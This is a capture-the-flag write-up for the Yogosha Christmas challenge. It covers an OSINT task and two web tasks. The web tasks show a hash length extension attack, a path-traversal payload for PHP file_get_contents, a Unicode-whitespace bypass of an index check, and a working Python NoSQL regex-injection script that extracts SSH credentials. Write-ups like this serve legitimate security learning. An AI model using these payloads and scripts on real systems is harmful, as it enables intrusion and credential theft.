# YogoshaChristmas 

The Christmas Challenge, started the 25th of December at 19:00 UTC and ended the 31st of December at 19:00 UTC, is a CTF hosted by Yogosha Team.
The CTF consists of 5 consecutive challenges, based on a Naruto story.
I've joined the CTF the 26th of December & played till the 30th. At the end of the CTF I've ranked 20.

<br/>

* ### Welcome Christmas (OSINT):

As a start & since it's an OSINT challenge, I googled the only thing I had: "ShisuiYogo".
I like Naruto but I haven't really watched it so I thought at first I'll probably need some knowledge about it
when I first landed on the Twitter profile & seen the picture of it.

I started digging around the profile, looking at the picture of it & the 4 posts in it but I had nothing in mind.
I even ended up checking the followers & the following of the account, I was so desperate to find a lead.

After a while, a pretty long one, I decided to actually focus on the content of the posts & get a meaning out of it.
The last post made me sure that I'll have to find what I'm looking for in an other website, not Twitter, but where?

<p align="center">
  <img src="/2021/YogoshaChristmas/img/post.jpg"><br/>
</p>

<br/>
As a first thought, I ended up looking in Github, thanks to the "master" of that. After a couple of searches I decided to move on.<br/>
So since I've spent a while looking everywhere, I decided to study a little about this character since I have no clue what's he talking about in the posts.
Not to mention that this'll probably be an other goal for the OSINT challenge, gathering information, right?

I started reading about Uchiha Shisui & Uchiha Clan. Also I've searched for the teleportation jutsu since it was mentioned in the Twitter post.
Now, I have a little bit of knowledge & I suppose I'm ready to refresh my mind & re-check what I currently have.

Again, I quickly rechecked the pictures, even checked the link in the profile picture but decided to move on quickly. I tried few words that I found in the story but no results.
I went again to the last post in the account to recheck it. What could the website be? 

"I'm a master of that jutsu", thanks to my little knowledge, I now know that Uchiha Shisui is known as a master of "Body Flicker" technique
and not the teleportation as the GIF shows, so I googled "Body Flicker" BUT I didn't get anything specific so...
I thought, It's a website right? so I googled "Body Flicker.com" & "BodyFlicker.com"

The moment I saw the "Body Flicker.com" search results, I realized that "Body Flicker" & "Flickr" are kinda the same...
I opened the site & searched as a start for pictures using "Uchiha Shisui", "Body Flicker", "ShisuiYogo"... but it's either I land on random pictures
or I land on nothing. 

I decided to search for a user instead & voila! Found "ShisuiYogo" with the same picture as the Twitter's!
I rushed to the only picture there, had a quick look on the picture incase there's something hidden but nothing so I continued checking around
I simply showed the EXIF data for the picture & here we go!

<p align="center">
  <img src="/2021/YogoshaChristmas/img/flag.jpg"><br/>
</p>

Flag: Yogosha{Shisui_H4s_G00d_ViSion}<br/>
Honestly, I didn't expect it to go this way, this was really fun & annoying at first. This is surely was worth spending hours on!<br/>
Now we got our flag & we got a lead for the next challenge.
```
I heard something important is stored in /secret.txt here: http://3.141.159.106 ; Maybe the akatsuki will help the Uchiha clan ?
```

* ### Uchiha Or Evil ? (WEB):

Now, the link we got will lead us to a website with a useless home page, at least he mentioned that.<br/>
Taking a look at the HTML code & we got nothing hidden in there, no hyperlinks or anything that can give us a lead so, as a normal thought, do we have by any chance a robots.txt file?
Checking that gave us the next piece of the puzzle
```
User-agent: Uchiha
Allow: /read.php
```

We see that we have a php file with a User-agent authorized to open it, It's time to get ourselves a better browser I suppose.<br/>
Launching Burp Suite & setting up the User-Agent header, we can now open the `read.php` file.

We get a form with a simple input box & a button, the input box contains the following:
```
184b5d255817fc0afe9316e67c8f386506a3b28b470c94f47583b76c7c0ec1e5|read.php
```

That looks like a hash, looking up for the type of it online gives us a possible SHA256 hash. Alright, let's move on, when we click on the button,
we notice that the same page gets included twice at the bottom. Switching to Burp to view the raw response, we find the PHP code of the page.

```php
<?php
include "secret.php";
if(isset($_POST['string'])){
	$arr=explode("|",$_POST['string']) ;
	$filenames=$arr[1];
	$hash=$arr[0];
	if($hash===hash("sha256", $SECRET.$filenames ) && preg_match("/\//",$filenames)===0 ){
		foreach(explode(":",$filenames) as $filename){
			if(in_array($filename,["read.php","index.php","guinjutsu.php"])) {
				$jutsu=file_get_contents($filename);
				echo "Sharingan: ".$jutsu;
		}
		}
	}
	else{
		echo "Verification Failed! You didn't awaken your sharingan!";
	}

}

}
?>
```

What we can see from this, we are sending an input which gets validated by the hash included in it & if it's valid we'll be able to pick get the content of
the 3 files; `read.php`, `index.php` & `guinjutsu.php`. Considering the lead we got from the previous challenge, we need to read /secret.txt but this wouldn't get us there.

Now, if we try to open `guinjutsu.php` we'll get a blank page so we probably need to get it's content to know what to do.

Looking up for the functions used in the PHP code, none of them is actually exploitable. The hash validation is using strict comparison so there'll be no type juggling.
Moreover, we are splitting our input using '|' as a seperator then we concat the 2nd part of it which includes a file name with a `$SECRET` then hash it
and we test that against our inputted hash. If the given hash is valid, we'll be able to get the content of a ':' seperated files (which are whitelisted).
Since the hash we already have is constant, we can be sure that our `$SECRET` is a constant value which is used to validate our input text.

At this point, I spent a whole day searching for any kind of exploit or vulnerability to use in order to move on. The main goal is bypassing the hash validation but we don't know
`$SECRET`. I looked up for the hash online but didn't find it so it's apparently not a known hash.

Later on, a hint was released which contained the following:

```
Is using hashes that way always secure ? Shisui is not sure about that since the old state of a hash is saved
```

After digging around, I figured out that hash states are used when you're trying to hash a long text/block of bytes, so instead of hashing them all together,
you can divide it & start appending blocks to your cipher one at a time, which then should give you the same hash as hashing everything together.

Looking for ways to exploit such a thing, we landed on the Hash Length Extension Attack. The attack is based on appending a payload to a pre-computed hash, giving us a new
payload that contains our text with a new hash that validates it, **without knowing the $SECRET** value, on fact, all what we'll need is to know a part of the text that gave 
us that hash & the length of the part which we do not know. And what makes things better, SHA256 is vulnerable for this kind of attack.

Back to our scene, we know that we are hasing `$SECRET + "readme.php"`, we do not know the length of $SECRET but we can bruteforce it.

Searching a little more on how to implement this attack, I landed on a pure python script ( [Attached here](/2021/YogoshaChristmas/files/hlextend.py) ) that implements 
this attack for a couple of hashing algorithms, SHA256 included. Since it's pure python, I shouldn't bother installing anything.

Starting to implement a script to test this attack, I re-implemented the PHP code in an online PHP compiler in order to test the exploit locally. Using the correct length it worked (Locally).

Now the real deal,I wrote this script ( [Attached here](/2021/YogoshaChristmas/files/Hash%20Length%20Ext%20Payload.py) ) in order to generate the paylods starting from 1 as the `$SECRET`
length upto 50 & saving them in a file.

Now, we head back to Burp Suite, we take a POST request from the history to the `read.php` page & send it to Intruder, we setup our payload position & load the payload file.<br/>
And we got a hit!

<p align="center">
  <img src="/2021/YogoshaChristmas/img/BurpHit.jpg"><br/>
</p>

Looking at the response we got, here is `guinjutsu.php` content:

```php
<?php
// This endpoint is deprecated due to some problems, I heard that other clans have stolen some jutsus
function check($url){
    $par=parse_url($url);
    if (((strpos($par['scheme'],'http')!==false)and($par['host']=='uchiha.fuinjutsukeeper.tech'))and($par['port']==5000)){
        return True;

    }
    else{
        return False;
    }

}
if (isset($_POST['submit'])){
    if ((isset($_POST['api']))and(isset($_POST['endpoint']))){
        $url=$_POST['api'].$_POST['endpoint'];
        if (check($url)){
            $opts = array(
			  'http'=>array(
				'method'=>"GET",
				'follow_location'=>false,
				'header'=>"Accept-language: en\r\n" 
			  )
			);
			$context = stream_context_create($opts);
			$file = file_get_contents($url, false, $context);
			echo $file;

		}
	}
}
?>
```

We can see that this is somekind of an API & we got a `file_get_contents` here! We can see that the `$url` is the concatination of `api` & `endpoint` params of POST so
we have full control over this variable. This looks interesting since the `$url` is passed to `file_get_contents` but we can see some kind of verification before reaching 
the function call.

```php
$par=parse_url($url);
if (((strpos($par['scheme'],'http')!==false)and($par['host']=='uchiha.fuinjutsukeeper.tech'))and($par['port']==5000)){
```

The first thing that caught my eyes was the strpos comparison, checking if the `strpos` return is not false is the same as checking if the `$par['scheme']` contains "http" so 
it can be anything that contains http, even if it's an invalid one. We see a check on the host & the port or the url too. We might be looking for a SSRF exploit here, so we
 might need a way to bypass the `parse_url` check.

After few researches, I landed on this PDF which was used in somekind of a presentation ( [Ref](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf) ).<br/>
What I found interesting is the following

<p align="center">
  <img src="/2021/YogoshaChristmas/img/PHPParse.png"><br/>
</p>

In our case, we are not using `readfile`, so how does this `file_get_contents` function behave if we give it some weird url? We can try using an invalid scheme for the url 
& check the response. Trying to use a valid scheme (HTTP) gives us nothing but a normal response with the page's content, which is `All jutsus were hidden somewhere Sorry`.

If we try to use an invalid scheme (as example "httpno"), we'll get the following error in the response
```
$ curl "http://3.141.159.106/guinjutsu.php" --data-raw "submit=a&api=httpno://uchiha.fuinjutsukeeper.tech:5000&endpoint="
<br />
<b>Warning</b>:  file_get_contents(): Unable to find the wrapper &quot;httpno&quot; - did you forget to enable it when you configured PHP? in <b>/var/www/html/guinjutsu.php</b> on line <b>26</b><br />
<br />
<b>Warning</b>:  file_get_contents(httpno://uchiha.fuinjutsukeeper.tech:5000): Failed to open stream: No such file or directory in <b>/var/www/html/guinjutsu.php</b> on line <b>26</b><br />
```

Focusing on the warning, we are getting a `Failed to open stream`, which looks as if PHP is trying to open that as a file? Let's try to actually get the "/secret.txt" content!

Using the following url : `httpno://uchiha.fuinjutsukeeper.tech:5000/../../../../../secret.txt`<br/>
We'll gladly get our flag & our next target:

```
Yogosha{Master_Of_ArbitraRy_ReAdiNg_JuTsu}
Someone calling himself madara said to Itachi to kill everyone, I'm not sure about this intel but if it's right no one can beat Itachi except Shisui. Check this forum they are using http://3.141.109.49
```

* ### Js and Uchiha Are Evils (WEB):

When we open the given url, we find ourselves on an other homepage, the only hyperlink we have leads us to a *jutsu* page which says

```
I heard that there is something interesting in jutsu number 1337, it's the most secret one!!
```

We notice that the url is `http://3.141.109.49/jutsu/0`, that 0 looks like an ID? Let's try other numbers...<br/>
Trying 1 would give us our lead

```javascript
I'm using the following to avoid access to jutsus higher than 9; is it safe? : 
let id = parseInt(request.params.id, 10); // baka saijin can't read the jutsus with id >9 
if (id > 9) { 
   return res.render("jutsu",{jutsu:"Access Denied sorry"}) 
} 
const jutsu = articles.at(id) ?? { jutsu: 'Not found' }; 
return res.render("jutsu",jutsu);
```

This looks like it's blocking numbers higher than 9, if we try to access ID 1337 as we were told, we'll get an `Access Denied sorry` so we are required to bypass the `id > 9` check. <br/>
Also we can see that our articles are saved in an array, se we can try negative numbers as an index. Doing so would result in `Hacking Attempted`, so we need to bypass this safety check.

As a start, I went to read about the [parseInt](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/parseInt) function. We can see that spaces are ignored, but when trying that, the code is still detecting our negative sign.<br/>
I honestly spent a pretty long while on this one, I thought at first of overflowing the parseInt result but such a thing didn't exist, It might give weird results for big numbers but nothing is negative.<br/>
After hours, the first hint released was `I heard that there is totally 10000 articles,this number will really help if you focus closely on the used functions :D /jutsu/1 is handy if you haven't seen it \o/` but this didn't really help for now. Later on, a second hint was released, `This check is done at the first line: if (/^[\b\t\n\v\f\r \xa0]*-/.test(req.params.id)) { Is checking negative jutsus is safely done ?`. This was it! regex! How haven't I thought of that? After reading this one, I figured out that I need to replace the white space character with an other space character that bypasses the regex pattern. A quick google search landed me on a list of whitespace character unicodes ( [Ref](https://jkorpela.fi/chars/spaces.html) ) so I picked \U2003 character & encoded it as UTF-8. Now, we need to get ID 1337 & the list contains 10000 elements, a quick calculation gives -8663 as an equivalent index for 1337, which gave me the following payload<br/>
`http://3.141.109.49/jutsu/%E2%80%83-8663`

And we get our response<br/>
`Wow,Awesome Jutsu! It's called Dockeru. I stored the jutsu code there: id=shisuiyogo pass=YogoShisuiIsStrong image=forum`

Now, we have an id & a password, I didn't know what `image=forum` meant at first but I definitely won't miss the `Dockeru`. This was an easy catch, Docker.<br/>
I had to install their app & login as the given user creds, I found an image named forum & now it makes sense.<br/>
I pulled the image & tried to start it up but got a couple of errors so I looked for an other way, I found out that I can access the image's shell without starting it so it makes it better.

When we open the shell, we find ourselves in the `/data/` folder, we check the files & this is a NodeJS app.

<p align="center">
  <img src="/2021/YogoshaChristmas/img/ImgShell.png"><br/>
</p>

Alright, we check the `index.js` file & find that we are still in the same website, we can see the `jutsu` part with the checks.<br/>
For reference, the file can be found [Here](/2021/YogoshaChristmas/files/index1.js) <br/>

Digging around a little more gives us nothing, we can find the pages' templates in the views folder & we can notice an `admin.ejs` page there but there is no access to it from the API so it has no use.

Time to start analyzing the code; 

```javascript
const client = new MongoClient(MONGO_URL);

//Insert important infos in the DB
var services=[
    {"Service":"web","username":"shisui","password":"Random","IP":"0000"},
    {"Service":"web","username":"itachi","password":"Secure","IP":"127.0.0.1"},
    {"Service":"ssh","username":process.env.USERNAME,"password":process.env.PASSWORD,"IP":process.env.IP},
    {"Service":"net","username":"sasuke","password":"Random","IP":"0000"}
];

client.connect(function(err) {
    if (err) return res.render("register", {
        error: "An unknown error has occured"
    });
    const db = client.db("uchiha");
    const collection = db.collection("services");
    collection.insertMany(services, function(err, res) {
        if (err) console.log(err);
        console.log("Number of documents inserted: " + res.insertedCount);
    });

});
```

As a start, we can see that we are using MongoDB as a database. Also we can notice that we have a hidden username & password taken from the system's environment variables inserted as an ssh service into the database alongside few other services. Checking the environment variables in the image leads us to nothing, let's keep going.<br/>
We can find an authentication part in our `index.js` file which is the following:

```javascript
app.get("/login", (req, res) => {
    if (req.session.username) {
        res.redirect(302, "/home");
    } else {
        return res.render("login", {
            error: ""
        });
    }
})

app.post("/login", (req, res) => {
    var username = req.body.username;
    if (username) {
        got.get(`http://3.141.109.49/auth/${encodeURI(username)}/users`).then((resp) => {
            if (resp.statusCode == 200) {
                req.session.username = username;
                return res.redirect(302, "/home");
            } else {
                return res.render("login", {
                    error: "Your username is wrong"
                });
            }
        }).catch((err) => {
            return res.render("login", {
                error: "Your username is wrong"
            });
        });
    } else {
        return res.redirect(302, "/login");
    }

});

//authentication
app.get("/auth/:username/users", (req, res) => {
    if (req.params.username == process.env.REDACTED) {
        return res.send("OK");
    } else {
        return res.sendStatus(202);
    }
})
```

Interesting way of validation, we can see that the `/login` route accepts a username in a POST method, then it checks for it by the `/auth/` route, if it gives an OK 200 response the username is considered valid, else it's wrong. We can check the `/auth` route, it accepts a the username as a parametre, compares it to a hidden environment variable value.<br/>
The username is passed after it gets URI encoded, we simply need to make the `/login` call open an other page that gives OK 200 response code instead of the auth, we can achieve that using `../jutsu/1` which should redirect us to `http://3.141.109.49/jutsu/1/users`<br/>
We can add a # in order to comment the last part of the url, resulting in the following payload: `../jutsu/1#`

We open the login page via the browser & we can see the author's suggestion about a Manga, Solo Leveling, sure I'll check it when I have time, back to the topic.<br/>
We drop our payload & we login, we get redirected to our home page.

Alright, the next part of the code, we can see a `/services` route, which required us to be logged in. 

```javascript
app.get("/services", (req, res) => {
    if (req.session.username) {
        return res.render("service", {
            error: ""
        });
    } else {
        return res.redirect(302, "/login");
    }
});

app.post("/services", (req, res) => {
    if (req.session.username) {
        if (req.body.service) {
            var query = JSON.parse(`{"Service":"${req.body.service}"}`);
            client.connect(function(err) {
                if (err) return res.render("service", {
                    error: "An unknown error has occured"
                });
                const db = client.db("uchiha");
                const collection = db.collection("services");
                collection.findOne(query, (err, result) => {
                    if (err) return res.render("service", {
                        error: "An unknown error has occured"
                    });
                    if (result) {
                        return res.render("service", {
                            error: "Service is UP"
                        });
                    } else {
                        return res.render("service", {
                            error: "Service is Down"
                        })
                    };
                });
            });
        } else {
            return res.render("service", {
                error: "An unknown error has occured"
            });
        }
    } else {
        return res.redirect(302, "/login");
    }
});
```

We can see that this page takes a POST parametre, service, and adds it in a string then parse it as a JSON ( ``var query = JSON.parse(`{"Service":"${req.body.service}"}`);`` ), such a thing makes it possible for us to control the JSON object. Now we can see that `query` is passed to the MongoDB `findOne` function, searching for the given service in the `services` collection. A small search about possible MongoDB attacks landed me on the NoSQL Injection. We can use comparison operators for the search query and also we can use regex!<br/>
Since we can control the query object, we can inject any search query we want into the `findOne` function but, the only result that the services page gives is either **UP** or **DOWN**. Well, pretty easy one but a little pain to get what we are looking for. My main goal was finding the hidden values in the code, to be more specific, the environment variables. From here, we can start by identifying the IP, USERNAME & PASSWORD.

As a first time try, we open the browser & try using the following input: `", "username":{"$gt":""}, "Service": "ssh`<br/>
Which will cause the `query` to be the following<br/>
```
{
    "Service": "",
    "username":{"$gt":""},
    "Service": "ssh"
}
```

And we get our expected answer, "Service is UP". So how can we exploit this now ?<br/>
I made a short python script that logins to the website & tries to guess the password using regular expressions, we can include a regex in our query by using the "$regex" operator. So what's our plan? We can start guessing the username value one character at a time, using the `^` operator for the regular expressions, as example, we can use `^[a-z]{1}.*` to match any service that have a username which starts with a character from a to z, we can start by lowercase characters & lower our interval till we reach a specific character, if no match we can go for the uppercase characters.

So after a little work, I got the following script: 

```python
import requests


def checkInterval(sess, minC, maxC, attribute, crackedValue):
    if minC != maxC:
        regex = "^"+crackedValue+"["+minC+"-"+maxC+"].*"
    else:
        regex = "^"+crackedValue+"["+minC+"].*" # Check for one specific character
        
    payload = '", "'+attribute+'":{"$regex":"'+regex+'"}, "Service": "ssh'
    
    resp = sess.post('http://3.141.109.49/services', data={'service': payload})
    if resp.content.find('Service is UP') != -1: # we got a hit
        return True
    else:
        return False


def findCharInRange(sess, minC, maxC, attribute, crackedValue):
    if minC == maxC:
        # Testing on a single character
        maxC = chr(ord(maxC)+1) # This should always give the same middle character, which is the character itself.
        
    while minC != maxC:
        middle = chr((ord(minC) + ord(maxC))/2)

        if checkInterval(sess, minC, middle, attribute, crackedValue):
            maxC = middle
        else:
            minC = chr(ord(middle)+1)
    
    return minC if checkInterval(sess, minC, minC, attribute, crackedValue) else False


def crackAttribute(sess, attribute, ip=False):
    """
        We add an ip variable in order to avoid checking for alphabet characters in an IP, useless.
    """
    value = ''
    while True:
        if ip:
            result = findCharInRange(sess, '0', '9', attribute, value)
            if result:
                value += result
            else:
                result = findCharInRange(sess, '.', '.', attribute, value)
                if result:
                    value += result
                else:
                    break
            
            continue
        
        result = findCharInRange(sess, 'a', 'z', attribute, value)
        if result:
            value += result
        else:
            result = findCharInRange(sess, 'A', 'Z', attribute, value)
            if result:
                value += result
            else:
                break
                
    return value

sess = requests.session()
sess.post('http://3.141.109.49/login', data={'username': '../jutsu/1#'}) # Login

print 'Username: ' + crackAttribute(sess, 'username')
print 'Password: ' + crackAttribute(sess, 'password')
print 'IP: ' + crackAttribute(sess, 'IP', True)
```

Might take few seconds to run but we still get our results:

<p align="center">
  <img src="/2021/YogoshaChristmas/img/NoSQLInjResults.png"><br/>
</p>

After reaching this point, I asked myself, Now what? I was tired & it was night so I went to take a rest & come back tomorrow<br/>
Looking at the results we got, the IP doesn't look like a random one, the IPs included in the code are local ones but this one isn't.<br/>
A quick nmap scan showed that port 22 & port 1337 are open & running an SSH service, the first one refused connection & the 2nd (1337) connected. Right upon connecting, we use the username & password we found and get our flag!

<br/>

<p align="center">
  <img src="/2021/YogoshaChristmas/img/Flag3.png"><br/>
</p>

* ### Uchiha As A Service
WIP
